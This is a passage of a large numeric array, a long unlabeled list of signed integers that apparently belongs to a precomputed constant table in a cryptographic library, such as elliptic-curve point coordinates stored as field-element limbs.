  -20861367,
  -13621002,
  -32810901,
  -11181622,
  -15545091,
  4387441,
  -20799378,
  12194512,
  3937617,
  -5805892,
  -27154820,
  9340370,
  -24513992,
  8548137,
  20617071,
  -7482001,
  -938825,
  -3930586,
  -8714311,
  16124718,
  24603125,
  -6225393,
  -13775352,
  -11875822,
  24345683,
  10325460,
  -19855277,
  -1568885,
  -22202708,
  8714034,
  14007766,
  6928528,
  16318175,
  -1010689,
  4766743,
  3552007,
  -21751364,
  -16730916,
  1351763,
  -803421,
  -4009670,
  3950935,
  3217514,
  14481909,
  10988822,
  -3994762,
  15564307,
  -14311570,
  3101243,
  5684148,
  30446780,
  -8051356,
  12677127,
  -6505343,
  -8295852,
  13296005,
  -9442290,
  6624296,
  -30298964,
  -11913677,
  -4670981,
  -2057379,
  31521204,
  9614054,
  -30000824,
  12074674,
  4771191,
  -135239,
  14290749,
  -13089852,
  27992298,
  14998318,
  -1413936,
  -1556716,
  29832613,
  -16391035,
  7064884,
  -7541174,
  -19161962,
  -5067537,
  -18891269,
  -2912736,
  25825242,
  5293297,
  -27122660,
  13101590,
  -2298563,
  2439670,
  -7466610,
  1719965,
  -27267541,
  -16328445,
  32512469,
  -5317593,
  -30356070,
  -4190957,
  -30006540,
  10162316,
  -33180176,
  3981723,
  -16482138,
  -13070044,
  14413974,
  9515896,
  19568978,
  9628812,
  33053803,
  199357,
  15894591,
  1583059,
  27380243,
  -4580435,
  -17838894,
  -6106839,
  -6291786,
  3437740,
  -18978877,
  3884493,
  19469877,
  12726490,
  15913552,
  13614290,
  -22961733,
  70104,
  7463304,
  4176122,
  -27124001,
  10659917,
  11482427,
  -16070381,
  12771467,
  -6635117,
  -32719404,
  -5322751,
  24216882,
  5944158,
  8894125,
  7450974,
  -2664149,
  -9765752,
  -28080517,
  -12389115,
  19345746,
  14680796,
  11632993,
  5847885,
  26942781,
  -2315317,
  9129564,
  -4906607,
  26024105,
  11769399,
  -11518837,
  6367194,
  -9727230,
  4782140,
  19916461,
  -4828410,
  -22910704,
  -11414391,
  25606324,
  -5972441,
  33253853,
  8220911,
  6358847,
  -1873857,
  801428,
  -2081702,
  16569428,
  11065167,
  29875704,
  96627,
  7908388,
  -4480480,
  -13538503,
  1387155,
  19646058,
  5720633,
  -11416706,
  12814209,
  11607948,
  12749789,
  14147075,
  15156355,
  -21866831,
  11835260,
  19299512,
  1155910,
  28703737,
  14890794,
  2925026,
  7269399,
  26121523,
  15467869,
  -26560550,
  5052483,
  -3017432,
  10058206,
  1980837,
  3964243,
  22160966,
  12322533,
  -6431123,
  -12618185,
  12228557,
  -7003677,
  32944382,
  14922211,
  -22844894,
  5188528,
  21913450,
  -8719943,
  4001465,
  13238564,
  -6114803,
  8653815,
  22865569,
  -4652735,
  27603668,
  -12545395,
  14348958,
  8234005,
  24808405,
  5719875,
  28483275,
  2841751,
  -16420968,
  -1113305,
  -327719,
  -12107856,
  21886282,
  -15552774,
  -1887966,
  -315658,
  19932058,
  -12739203,
  -11656086,
  10087521,
  -8864888,
  -5536143,
  -19278573,
  -3055912,
  3999228,
  13239134,
  -4777469,
  -13910208,
  1382174,
  -11694719,
  17266790,
  9194690,
  -13324356,
  9720081,
  20403944,
  11284705,
  -14013818,
  3093230,
  16650921,
  -11037932,
  -1064178,
  1570629,
  -8329746,
  7352753,
  -302424,
  16271225,
  -24049421,
  -6691850,
  -21911077,
  -5927941,
  -4611316,
  -5560156,
  -31744103,
  -10785293,
  24123614,
  15193618,
  -21652117,
  -16739389,
  -9935934,
  -4289447,
  -25279823,
  4372842,
  2087473,
  10399484,
  31870908,
  14690798,
  17361620,
  11864968,
  -11307610,
  6210372,
  13206574,
  5806320,
  -29017692,
  -13967200,
  -12331205,
  -7486601,
  -25578460,
  -16240689,
  14668462,
  -12270235,
  26039039,
  15305210,
  25515617,
  4542480,
  10453892,
  6577524,
  9145645,
  -6443880,
  5974874,
  3053895,
  -9433049,
  -10385191,
  -31865124,
  3225009,
  -7972642,
  3936128,
  -5652273,
  -3050304,
  30625386,
  -4729400,
  -25555961,
  -12792866,
  -20484575,
  7695099,
  17097188,
  -16303496,
  -27999779,
  1803632,
  -3553091,
  9865099,
  -5228566,
  4272701,
  -5673832,
  -16689700,
  14911344,
  12196514,
  -21405489,
  7047412,
  20093277,
  9920966,
  -11138194,
  -5343857,
  13161587,
  12044805,
  -32856851,
  4124601,
  -32343828,
  -10257566,
  -20788824,
  14084654,
  -13531713,
  7842147,
  19119038,
  -13822605,
  4752377,
  -8714640,
  -21679658,
  2288038,
  -26819236,
  -3283715,
  29965059,
  3039786,
  -14473765,
  2540457,
  29457502,
  14625692,
  -24819617,
  12570232,
  -1063558,
  -11551823,
  16920318,
  12494842,
  1278292,
  -5869109,
  -21159943,
  -3498680,
  -11974704,
  4724943,
  17960970,
  -11775534,
  -4140968,
  -9702530,
  -8876562,
  -1410617,
  -12907383,
  -8659932,
  -29576300,
  1903856,
  23134274,
  -14279132,
  -10681997,
  -1611936,
  20684485,
  15770816,
  -12989750,
  3190296,
  26955097,
  14109738,
  15308788,
  5320727,
  -30113809,
  -14318877,
  22902008,
  7767164,
  29425325,
  -11277562,
  31960942,
  11934971,
  -27395711,
  8435796,
  4109644,
  12222639,
  -24627868,
  14818669,
  20638173,
  4875028,
  10491392,
  1379718,
  -13159415,
  9197841,
  3875503,
  -8936108,
  -1383712,
  -5879801,
  33518459,
  16176658,
  21432314,
  12180697,
  -11787308,
  11500838,
  13787581,
  -13832590,
  -22430679,
  10140205,
  1465425,
  12689540,
  -10301319,
  -13872883,
  5414091,
  -15386041,
  -21007664,
  9643570,
  12834970,
  1186149,
  -2622916,
  -1342231,
  26128231,
  6032912,
  -26337395,
  -13766162,
  32496025,
  -13653919,
  17847801,
  -12669156,
  3604025,
  8316894,
  -25875034,
  -10437358,
  3296484,
  6223048,
  24680646,
  -12246460,
  -23052020,
  5903205,
  -8862297,
  -4639164,
  12376617,
  3188849,
  29190488,
  -14659046,
  27549113,
  -1183516,
  3520066,
  -10697301,
  32049515,
  -7309113,
  -16109234,
  -9852307,
  -14744486,
  -9309156,
  735818,
  -598978,
  -20407687,
  -5057904,
  25246078,
  -15795669,
  18640741,
  -960977,
  -6928835,
  -16430795,
  10361374,
  5642961,
  4910474,
  12345252,
  -31638386,
  -494430,
  10530747,
  1053335,
  -29265967,
  -14186805,
  -13538216,
  -12117373,
  -19457059,
  -10655384,
  -31462369,
  -2948985,
  24018831,
  15026644,
  -22592535,
  -3145277,
  -2289276,
  5953843,
  -13440189,
  9425631,
  25310643,
  13003497,
  -2314791,
  -15145616,
  -27419985,
  -603321,
  -8043984,
  -1669117,
  -26092265,
  13987819,
  -27297622,
  187899,
  -23166419,
  -2531735,
  -21744398,
  -13810475,
  1844840,
  5021428,
  -10434399,
  -15911473,
  9716667,
  16266922,
  -5070217,
  726099,
  29370922,
  -6053998,
  7334071,
  -15342259,
  9385287,
  2247707,
  -13661962,
  -4839461,
  30007388,
  -15823341,
  -936379,
  16086691,
  23751945,
  -543318,
  -1167538,
  -5189036,
  9137109,
  730663,
  9835848,
  4555336,
  -23376435,
  1410446,
  -22253753,
  -12899614,
  30867635,
  15826977,
  17693930,
  544696,
  -11985298,
  12422646,
  31117226,
  -12215734,
  -13502838,
  6561947,
  -9876867,
  -12757670,
  -5118685,
  -4096706,
  29120153,
  13924425,
  -17400879,
  -14233209,
  19675799,
  -2734756,
  -11006962,
  -5858820,
  -9383939,
  -11317700,
  7240931,
  -237388,
  -31361739,
  -11346780,
  -15007447,
  -5856218,
  -22453340,
  -12152771,
  1222336,
  4389483,
  3293637,
  -15551743,
  -16684801,
  -14444245,
  11038544,
  11054958,
  -13801175,
  -3338533,
  -24319580,
  7733547,
  12796905,
  -6335822,
  -8759414,
  -10817836,
  -25418864,
  10783769,
  -30615557,
  -9746811,
  -28253339,
  3647836,
  3222231,
  -11160462,
  18606113,
  1693100,
  -25448386,
  -15170272,
  4112353,
  10045021,
  23603893,
  -2048234,
  -7550776,
  2484985,
  9255317,
  -3131197,
  -12156162,
  -1004256,
  13098013,
  -9214866,
  16377220,
  -2102812,
  -19802075,
  -3034702,
  -22729289,
  7496160,
  -5742199,
  11329249,
  19991973,
  -3347502,
  -31718148,
  9936966,
  -30097688,
  -10618797,
  21878590,
  -5001297,
  4338336,
  13643897,
  -3036865,
  13160960,
  19708896,
  5415497,
  -7360503,
  -4109293,
  27736861,
  10103576,
  12500508,
  8502413,
  -3413016,
  -9633558,
  10436918,
  -1550276,
  -23659143,
  -8132100,
  19492550,
  -12104365,
  -29681976,
  -852630,
  -3208171,
  12403437,
  30066266,
  8367329,
  13243957,
  8709688,
  12015105,
  2801261,
  28198131,
  10151021,
  24818120,
  -4743133,
  -11194191,
  -5645734,
  5150968,
  7274186,
  2831366,
  -12492146,
  1478975,
  6122054,
  23825128,
  -12733586,
  31097299,
  6083058,
  31021603,
  -9793610,
  -2529932,
  -2229646,
  445613,
  10720828,
  -13849527,
  -11505937,
  -23507731,
  16354465,
  15067285,
  -14147707,
  7840942,
  14037873,
  -33364863,
  15934016,
  -728213,
  -3642706,
  21403988,
  1057586,
  -19379462,
  -12403220,
  915865,
  -16469274,
  15608285,
  -8789130,
  -24357026,
  6060030,
  -17371319,
  8410997,
  -7220461,
  16527025,
  32922597,
  -556987,
  20336074,
  -16184568,
  10903705,
  -5384487,
  16957574,
  52992,
  23834301,
  6588044,
  32752030,
  11232950,
  3381995,
  -8714866,
  22652988,
  -10744103,
  17159699,
  16689107,
  -20314580,
  -1305992,
  -4689649,
  9166776,
  -25710296,
  -10847306,
  11576752,
  12733943,
  7924251,
  -2752281,
  1976123,
  -7249027,
  21251222,
  16309901,
  -2983015,
  -6783122,
  30810597,
  12967303,
  156041,
  -3371252,
  12331345,
  -8237197,
  8651614,
  -4477032,
  -16085636,
  -4996994,
  13002507,
  2950805,
  29054427,
  -5106970,
  10008136,
  -4667901,
  31486080,
  15114593,
  -14261250,
  12951354,
  14369431,
  -7387845,
  16347321,
  -13662089,
  8684155,
  -10532952,
  19443825,
  11385320,
  24468943,
  -9659068,
  -23919258,
  2187569,
  -26263207,
  -6086921,
  31316348,
  14219878,
  -28594490,
  1193785,
  32245219,
  11392485,
  31092169,
  15722801,
  27146014,
  6992409,
  29126555,
  9207390,
  32382935,
  1110093,
  18477781,
  11028262,
  -27411763,
  -7548111,
  -4980517,
  10843782,
  -7957600,
  -14435730,
  2814918,
  7836403,
  27519878,
  -7868156,
  -20894015,
  -11553689,
  -21494559,
  8550130,
  28346258,
  1994730,
  -19578299,
  8085545,
  -14000519,
  -3948622,
  2785838,
  -16231307,
  -19516951,
  7174894,
  22628102,
  8115180,
  -30405132,
  955511,
  -11133838,
  -15078069,
  -32447087,
  -13278079,
  -25651578,
  3317160,
  -9943017,
  930272,
  -15303681,
  -6833769,
  28856490,
  1357446,
  23421993,
  1057177,
  24091212,
  -1388970,
  -22765376,
  -10650715,
  -22751231,
  -5303997,
  -12907607,
  -12768866,
  -15811511,
  -7797053,
  -14839018,
  -16554220,
  -1867018,
  8398970,
  -31969310,
  2106403,
  -4736360,
  1362501,
  12813763,
  16200670,
  22981545,
  -6291273,
  18009408,
  -15772772,
  -17220923,
  -9545221,
  -27784654,
  14166835,
  29815394,
  7444469,
  29551787,
  -3727419,
  19288549,
  1325865,
  15100157,
  -15835752,
  -23923978,
  -1005098,
  -26450192,
  15509408,
  12376730,
  -3479146,
  33166107,
  -8042750,
  20909231,
  13023121,
  -9209752,
  16251778,
  -5778415,
  -8094914,
  12412151,
  10018715,
  2213263,
  -13878373,
  32529814,
  -11074689,
  30361439,
  -16689753,
  -9135940,
  1513226,
  22922121,
  6382134,
  -5766928,
  8371348,
  9923462,
  11271500,
  12616794,
  3544722,
  -29998368,
  -1721626,
  12891687,
  -8193132,
  -26442943,
  10486144,
  -22597207,
  -7012665,
  8587003,
  -8257861,
  4084309,
  -12970062,
  361726,
  2610596,
  -23921530,
  -11455195,
  5408411,
  -1136691,
  -4969122,
  10561668,
  24145918,
  14240566,
  31319731,
  -4235541,
  19985175,
  -3436086,
  -13994457,
  16616821,
  14549246,
  3341099,
  32155958,
  13648976,
  -17577068,
  8849297,
  65030,
  8370684,
  -8320926,
  -12049626,
  31204563,
  5839400,
  -20627288,
  -1057277,
  -19442942,
  6922164,
  12743482,
  -9800518,
  -2361371,
  12678785,
  28815050,
  4759974,
  -23893047,
  4884717,
  23783145,
  11038569,
  18800704,
  255233,
  -5269658,
  -1773886,
  13957886,
  7990715,
  23132995,
  728773,
  13393847,
  9066957,
  19258688,
  -14753793,
  -2936654,
  -10827535,
  -10432089,
  14516793,
  -3640786,
  4372541,
  -31934921,
  2209390,
  -1524053,
  2055794,
  580882,
  16705327,
  5468415,
  -2683018,
  -30926419,
  -14696000,
  -7203346,
  -8994389,
  -30021019,
  7394435,
  23838809,
  1822728,
  -15738443,
  15242727,
  8318092,
  -3733104,
  -21672180,
  -3492205,
  -4821741,
  14799921,
  13345610,
  9759151,
  3371034,
  -16137791,
  16353039,
  8577942,
  31129804,
  13496856,
  -9056018,
  7402518,
  2286874,
  -4435931,
  -20042458,
  -2008336,
  -13696227,
  5038122,
  11006906,
  -15760352,
  8205061,
  1607563,
  14414086,
  -8002132,
  3331830,
  -3208217,
  22249151,
  -5594188,
  18364661,
  -2906958,
  30019587,
  -9029278,
  -27688051,
  1585953,
  -10775053,
  931069,
  -29120221,
  -11002319,
  -14410829,
  12029093,
  9944378,
  8024,
  4368715,
  -3709630,
  29874200,
  -15022983,
  -20230386,
  -11410704,
  -16114594,
  -999085,
  -8142388,
  5640030,
  10299610,
  13746483,
  11661824,
  16234854,
  7630238,
  5998374,
  9809887,
  -16694564,
  15219798,
  -14327783,
  27425505,
  -5719081,
  3055006,
  10660664,
  23458024,
  595578,
  -15398605,
  -1173195,
  -18342183,
  9742717,
  6744077,
  2427284,
  26042789,
  2720740,
  -847906,
  1118974,
  32324614,
  7406442,
  12420155,
  1994844,
  14012521,
  -5024720,
  -18384453,
  -9578469,
  -26485342,
  -3936439,
  -13033478,
  -10909803,
  24319929,
  -6446333,
  16412690,
  -4507367,
  10772641,
  15929391,
  -17068788,
  -4658621,
  10555945,
  -10484049,
  -30102368,
  -4739048,
  22397382,
  -7767684,
  -9293161,
  -12792868,
  17166287,
  -9755136,
  -27333065,
  6199366,
  21880021,
  -12250760,
  -4283307,
  5368523,
  -31117018,
  8163389,
  -30323063,
  3209128,
  16557151,
  8890729,
  8840445,
  4957760,
  -15447727,
  709327,
  -6919446,
  -10870178,
  -29777922,
  6522332,
  -21720181,
  12130072,
  -14796503,
  5005757,
  -2114751,
  -14308128,
  23019042,
  15765735,
  -25269683,
  6002752,
  10183197,
  -13239326,
  -16395286,
  -2176112,
  -19025756,
  1632005,
  13466291,
  -7995100,
  -23640451,
  16573537,
  -32013908,
  -3057104,
  22208662,
  2000468,
  3065073,
  -1412761,
  -25598674,
  -361432,
  -17683065,
  -5703415,
  -8164212,
  11248527,
  -3691214,
  -7414184,
  10379208,
  -6045554,
  8877319,
  1473647,
  -29291284,
  -12507580,
  16690915,
  2553332,
  -3132688,
  16400289,
  15716668,
  1254266,
  -18472690,
  7446274,
  -8448918,
  6344164,
  -22097271,
  -7285580,
  26894937,
  9132066,
  24158887,
  12938817,
  11085297,
  -8177598,
  -28063478,
  -4457083,
  -30576463,
  64452,
  -6817084,
  -2692882,
  13488534,
  7794716,
  22236231,
  5989356,
  25426474,
  -12578208,
  2350710,
  -3418511,
  -4688006,
  2364226,
  16335052,
  9132434,
  25640582,
  6678888,
  1725628,
  8517937,
  -11807024,
  -11697457,
  15445875,
  -7798101,
  29004207,
  -7867081,
  28661402,
  -640412,
  -12794003,
  -7943086,
  31863255,
  -4135540,
  -278050,
  -15759279,
  -6122061,
  -14866665,
  -28614905,
  14569919,
  -10857999,
  -3591829,
  10343412,
  -6976290,
  -29828287,
  -10815811,
  27081650,
  3463984,
  14099042,
  -4517604,
  1616303,
  -6205604,
  29542636,
  15372179,
  17293797,
  960709,
  20263915,
  11434237,
  -5765435,
  11236810,
  13505955,
  -10857102,
  -16111345,
  6493122,
  -19384511,
  7639714,
  -2830798,
  -14839232,
  25403038,
  -8215196,
  -8317012,
  -16173699,
  18006287,
  -16043750,
  29994677,
  -15808121,
  9769828,
  5202651,
  -24157398,
  -13631392,
  -28051003,
  -11561624,
  -24613141,
  -13860782,
  -31184575,
  709464,
  12286395,
  13076066,
  -21775189,
  -1176622,
  -25003198,
  4057652,
  -32018128,
  -8890874,
  16102007,
  13205847,
  13733362,
  5599946,
  10557076,
  3195751,
  -5557991,
  8536970,
  -25540170,
  8525972,
  10151379,
  10394400,
  4024660,
  -16137551,
  22436262,
  12276534,
  -9099015,
  -2686099,
  19698229,
  11743039,
  -33302334,
  8934414,
  -15879800,
  -4525240,
  -8580747,
  -2934061,
  14634845,
  -698278,
  -9449077,
  3137094,
  -11536886,
  11721158,
  17555939,
  -5013938,
  8268606,
  2331751,
  -22738815,
  9761013,
  9319229,
  8835153,
  -9205489,
  -1280045,
  -461409,
  -7830014,
  20614118,
  16688288,
  -7514766,
  -4807119,
  22300304,
  505429,
  6108462,
  -6183415,
  -5070281,
  12367917,
  -30663534,
  3234473,
  32617080,
  -8422642,
  29880583,
  -13483331,
  -26898490,
  -7867459,
  -31975283,
  5726539,
  26934134,
  10237677,
  -3173717,
  -605053,
  24199304,
  3795095,
  7592688,
  -14992079,
  21594432,
  -14964228,
  17466408,
  -4077222,
  32537084,
  2739898,
  6407723,
  12018833,
  -28256052,
  4298412,
  -20650503,
  -11961496,
  -27236275,
  570498,
  3767144,
  -1717540,
  13891942,
  -1569194,
  13717174,
  10805743,
  -14676630,
  -15644296,
  15287174,
  11927123,
  24177847,
  -8175568,
  -796431,
  14860609,
  -26938930,
  -5863836,
  12962541,
  5311799,
  -10060768,
  11658280,
  18855286,
  -7954201,
  13286263,
  -12808704,
  -4381056,
  9882022,
  18512079,
  11319350,
  -20123124,
  15090309,
  18818594,
  5271736,
  -22727904,
  3666879,
  -23967430,
  -3299429,
  -6789020,
  -3146043,
  16192429,
  13241070,
  15898607,
  -14206114,
  -10084880,
  -6661110,
  -2403099,
  5276065,
  30169808,
  -5317648,
  26306206,
  -11750859,
  27814964,
  7069267,
  7152851,
  3684982,
  1449224,
  13082861,
  10342826,
  3098505,
  2119311,
  193222,
  25702612,
  12233820,
  23697382,
  15056736,
  -21016438,
  -8202000,
  -33150110,
  3261608,
  22745853,
  7948688,
  19370557,
  -15177665,
  -26171976,
  6482814,
  -10300080,
  -11060101,
  32869458,
  -5408545,
  25609743,
  15678670,
  -10687769,
  -15471071,
  26112421,
  2521008,
  -22664288,
  6904815,
  29506923,
  4457497,
  3377935,
  -9796444,
  -30510046,
  12935080,
  1561737,
  3841096,
  -29003639,
  -6657642,
  10340844,
  -6630377,
  -18656632,
  -2278430,
  12621151,
  -13339055,
  30878497,
  -11824370,
  -25584551,
  5181966,
  25940115,
  -12658025,
  17324188,
  -10307374,
  -8671468,
  15029094,
  24396252,
  -16450922,
  -2322852,
  -12388574,
  -21765684,
  9916823,
  -1300409,
  4079498,
  -1028346,
  11909559,
  1782390,
  12641087,
  20603771,
  -6561742,
  -18882287,
  -11673380,
  24849422,
  11501709,
  13161720,
  -4768874,
  1925523,
  11914390,
  4662781,
  7820689,
  12241050,
  -425982,
  8132691,
  9393934,
  32846760,
  -1599620,
  29749456,
  12172924,
  16136752,
  15264020,
  -10349955,
  -14680563,
  -8211979,
  2330220,
  -17662549,
  -14545780,
  10658213,
  6671822,
  19012087,
  3772772,
  3753511,
  -3421066,
  10617074,
  2028709,
  14841030,
  -6721664,
  28718732,
  -15762884,
  20527771,
  12988982,
  -14822485,
  -5797269,
  -3707987,
  12689773,
  -898983,
  -10914866,
  -24183046,
  -10564943,
  3299665,
  -12424953,
  -16777703,
  -15253301,
  -9642417,
  4978983,
  3308785,
  8755439,
  6943197,
  6461331,
  -25583147,
  8991218,
  -17226263,
  1816362,
  -1673288,
  -6086439,
  31783888,
  -8175991,
  -32948145,
  7417950,
  -30242287,
  1507265,
  29692663,
  6829891,
  -10498800,
  4334896,
  20945975,
  -11906496,
  -28887608,
  8209391,
  14606362,
  -10647073,
  -3481570,
  8707081,
  32188102,
  5672294,
  22096700,
  1711240,
  -33020695,
  9761487,
  4170404,
  -2085325,
  -11587470,
  14855945,
  -4127778,
  -1531857,
  -26649089,
  15084046,
  22186522,
  16002000,
  -14276837,
  -8400798,
  -4811456,
  13761029,
  -31703877,
  -2483919,
  -3312471,
  7869047,
  -7113572,
  -9620092,
  13240845,
  10965870,
  -7742563,
  -8256762,
  -14768334,
  -13656260,
  -23232383,
  12387166,
  4498947,
  14147411,
  29514390,
  4302863,
  -13413405,
  -12407859,
  20757302,
  -13801832,
  14785143,
  8976368,
  -5061276,
  -2144373,
  17846988,
  -13971927,
  -2244452,
  -754728,
  -4597030,
  -1066309,
  -6247172,
  1455299,
  -21647728,
  -9214789,
  -5222701,
  12650267,
  -9906797,
  -16070310,
  21134160,
  12198166,
  -27064575,
  708126,
  387813,
  13770293,
  -19134326,
  10958663,
  22470984,
  12369526,
  23446014,
  -5441109,
  -21520802,
  -9698723,
  -11772496,
  -11574455,
  -25083830,
  4271862,
  -25169565,
  -10053642,
  -19909332,
  15361595,
  -5984358,
  2159192,
  75375,
  -4278529,
  -32526221,
  8469673,
  15854970,
  4148314,
  -8893890,
  7259002,
  11666551,
  13824734,
  -30531198,
  2697372,
  24154791,
  -9460943,
  15446137,
  -15806644,
  29759747,
  14019369,
  30811221,
  -9610191,
  -31582008,
  12840104,
  24913809,
  9815020,
  -4709286,
  -5614269,
  -31841498,
  -12288893,
  -14443537,
  10799414,
  -9103676,
  13438769,
  18735128,
  9466238,
  11933045,
  9281483,
  5081055,
  -5183824,
  -2628162,
  -4905629,
  -7727821,
  -10896103,
  -22728655,
  16199064,
  14576810,
  379472,
  -26786533,
  -8317236,
  -29426508,
  -10812974,
  -102766,
  1876699,
  30801119,
  2164795,
  15995086,
  3199873,
  13672555,
  13712240,
  -19378835,
  -4647646,
  -13081610,
  -15496269,
  -13492807,
  1268052,
  -10290614,
  -3659039,
  -3286592,
  10948818,
  23037027,
  3794475,
  -3470338,
  -12600221,
  -17055369,
  3565904,
  29210088,
  -9419337,
  -5919792,
  -4952785,
  10834811,
  -13327726,
  -16512102,
  -10820713,
  -27162222,
  -14030531,
  -13161890,
  15508588,
  16663704,
  -8156150,
  -28349942,
  9019123,
  -29183421,
  -3769423,
  2244111,
  -14001979,
  -5152875,
  -3800936,
  -9306475,
  -6071583,
  16243069,
  14684434,
  -25673088,
  -16180800,
  13491506,
  4641841,
  10813417,
  643330,
  -19188515,
  -728916,
  30292062,
  -16600078,
  27548447,
  -7721242,
  14476989,
  -12767431,
  10292079,
  9984945,
  6481436,
  8279905,
  -7251514,
  7032743,
  27282937,
  -1644259,
  -27912810,
  12651324,
  -31185513,
  -813383,
  22271204,
  11835308,
  10201545,
  15351028,
  17099662,
  3988035,
  21721536,
  -3148940,
  10202177,
  -6545839,
  -31373232,
  -9574638,
  -32150642,
  -8119683,
  -12906320,
  3852694,
  13216206,
  14842320,
  -15815640,
  -10601066,
  -6538952,
  -7258995,
  -6984659,
  -6581778,
  -31500847,
  13765824,
  -27434397,
  9900184,
  14465505,
  -13833331,
  -32133984,
  -14738873,
  -27443187,
  12990492,
  33046193,
  15796406,
  -7051866,
  -8040114,
  30924417,
  -8279620,
  6359016,
  -12816335,
  16508377,
  9071735,
  -25488601,
  15413635,
  9524356,
  -7018878,
  12274201,
  -13175547,
  32627641,
  -1785326,
  6736625,
  13267305,
  5237659,
  -5109483,
  15663516,
  4035784,
  -2951309,
  8903985,
  17349946,
  601635,
  -16432815,
  -4612556,
  -13732739,
  -15889334,
  -22258478,
  4659091,
  -16916263,
  -4952973,
  -30393711,
  -15158821,
  20774812,
  15897498,
  5736189,
  15026997,
  -2178256,
  -13455585,
  -8858980,
  -2219056,
  28571666,
  -10155518,
  -474467,
  -10105698,
  -3801496,
  278095,
  23440562,
  -290208,
  10226241,
  -5928702,
  15139956,
  120818,
  -14867693,
  5218603,
  32937275,
  11551483,
  -16571960,
  -7442864,
  17932739,
  -12437276,
  -24039557,
  10749060,
  11316803,
  7535897,
  22503767,
  5561594,
  -3646624,
  3898661,
  7749907,
  -969567,
  -16339731,
  -16464,
  -25018111,
  15122143,
  -1573531,
  7152530,
  21831162,
  1245233,
  26958459,
  -14658026,
  4314586,
  8346991,
  -5677764,
  11960072,
  -32589295,
  -620035,
  -30402091,
  -16716212,
  -12165896,
  9166947,
  33491384,
  13673479,
  29787085,
  13096535,
  6280834,
  14587357,
  -22338025,
  13987525,
  -24349909,
  7778775,
  21116000,
  15572597,
  -4833266,
  -5357778,
  -4300898,
  -5124639,
  -7469781,
  -2858068,
  9681908,
  -6737123,
  -31951644,
  13591838,
  -6883821,
  386950,
  31622781,
  6439245,
  -14581012,
  4091397,
  -8426427,
  1470727,
  -28109679,
  -1596990,
  3978627,
  -5123623,
  -19622683,
  12092163,
  29077877,
  -14741988,
  5269168,
  -6859726,
  -13230211,
  -8020715,
  25932563,
  1763552,
  -5606110,
  -5505881,
  -20017847,
  2357889,
  32264008,
  -15407652,
  -5387735,
  -1160093,
  -2091322,
  -3946900,
  23104804,
  -12869908,
  5727338,
  189038,
  14609123,
  -8954470,
  -6000566,
  -16622781,
  -14577387,
  -7743898,
  -26745169,
  10942115,
  -25888931,
  -14884697,
  20513500,
  5557931,
  -15604613,
  7829531,
  26413943,
  -2019404,
  -21378968,
  7471781,
  13913677,
  -5137875,
  -25574376,
  11967826,
  29233242,
  12948236,
  -6754465,
  4713227,
  -8940970,
  14059180,
  12878652,
  8511905,
  -25656801,
  3393631,
  -2955415,
  -7075526,
  -2250709,
  9366908,
  -30223418,
  6812974,
  5568676,
  -3127656,
  11630004,
  12144454,
  2116339,
  13606037,
  27378885,
  15676917,
  -17408753,
  -13504373,
  -14395196,
  8070818,
  27117696,
  -10007378,
  -31282771,
  -5570088,
  1127282,
  12772488,
  -29845906,
  10483306,
  -11552749,
  -1028714,
  10637467,
  -5688064,
  5674781,
  1072708,
  -26343588,
  -6982302,
  -1683975,
  9177853,
  -27493162,
  15431203,
  20525145,
  10892566,
  -12742472,
  12779443,
  -29493034,
  16150075,
  -28240519,
  14943142,
  -15056790,
  -7935931,
  -30024462,
  5626926,
  -551567,
  -9981087,
  753598,
  11981191,
  25244767,
  -3239766,
  -3356550,
  9594024,
  -23752644,
  2636870,
  -5163910,
  -10103818,
  585134,
  7877383,
  11345683,
  -6492290,
  13352335,
  -10977084,
  -1931799,
  -5407458,
  3304649,
  -12884869,
  17015806,
  -4877091,
  -29783850,
  -7752482,
  -13215537,
  -319204,
  20239939,
  6607058,
  6203985,
  3483793,
  -18386976,
  -779229,
  -20723742,
  15077870,
  -22750759,
  14523817,
  27406042,
  -6041657,
  27423596,
  -4497394,
  4996214,
  10002360,
  -28842031,
  -4545494,
  -30172742,
  -4805667,
  11374242,
  12660715,
  17861383,
  -12540833,
  10935568,
  1099227,
  -13886076,
  -9091740,
  -27727044,
  11358504,
  -12730809,
  10311867,
  1510375,
  10778093,
  -2119455,
  -9145702,
  32676003,
  11149336,
  -26123651,
  4985768,
  -19096303,
  341147,
  -6197485,
  -239033,
  15756973,
  -8796662,
  -983043,
  13794114,
  -19414307,
  -15621255,
  6490081,
  11940286,
  25495923,
  -7726360,
  8668373,
  -8751316,
  3367603,
  6970005,
  -1691065,
  -9004790,
  1656497,
  13457317,
  15370807,
  6364910,
  13605745,
  8362338,
  -19174622,
  -5475723,
  -16796596,
  -5031438,
  -22273315,
  -13524424,
  -64685,
  -4334223,
  -18605636,
  -10921968,
  -20571065,
  -7007978,
  -99853,
  -10237333,
  17747465,
  10039260,
  19368299,
  -4050591,
  -20630635,
  -16041286,
  31992683,
  -15857976,
  -29260363,
  -5511971,
  31932027,
  -4986141,
  -19612382,
  16366580,
  22023614,
  88450,
  11371999,
  -3744247,
  4882242,
  -10626905,
  29796507,
  37186,
  19818052,
  10115756,
  -11829032,
  3352736,
  18551198,
  3272828,
  -5190932,
  -4162409,
  12501286,
  4044383,
  -8612957,
  -13392385,
  -32430052,
  5136599,
  -19230378,
  -3529697,
  330070,
  -3659409,
  6384877,
  2899513,
  17807477,
  7663917,
  -2358888,
  12363165,
  25366522,
  -8573892,
  -271295,
  12071499,
  -8365515,
  -4042521,
  25133448,
  -4517355,
  -6211027,
  2265927,
  -32769618,
  1936675,
  -5159697,
  3829363,
  28425966,
  -5835433,
  -577090,
  -4697198,
  -14217555,
  6870930,
  7921550,
  -6567787,
  26333140,
  14267664,
  -11067219,
  11871231,
  27385719,
  -10559544,
  -4585914,
  -11189312,
  10004786,
  -8709488,
  -21761224,
  8930324,
  -21197785,
  -16396035,
  25654216,
  -1725397,
  12282012,
  11008919,
  1541940,
  4757911,
  -26491501,
  -16408940,
  13537262,
  -7759490,
  -20604840,
  10961927,
  -5922820,
  -13218065,
  -13156584,
  6217254,
  -15943699,
  13814990,
  -17422573,
  15157790,
  18705543,
  29619,
  24409717,
  -260476,
  27361681,
  9257833,
  -1956526,
  -1776914,
  -25045300,
  -10191966,
  15366585,
  15166509,
  -13105086,
  8423556,
  -29171540,
  12361135,
  -18685978,
  4578290,
  24579768,
  3711570,
  1342322,
  -11180126,
  -27005135,
  14124956,
  -22544529,
  14074919,
  21964432,
  8235257,
  -6528613,
  -2411497,
  9442966,
  -5925588,
  12025640,
  -1487420,
  -2981514,
  -1669206,
  13006806,
  2355433,
  -16304899,
  -13605259,
  -6632427,
  -5142349,
  16974359,
  -10911083,
  27202044,
  1719366,
  1141648,
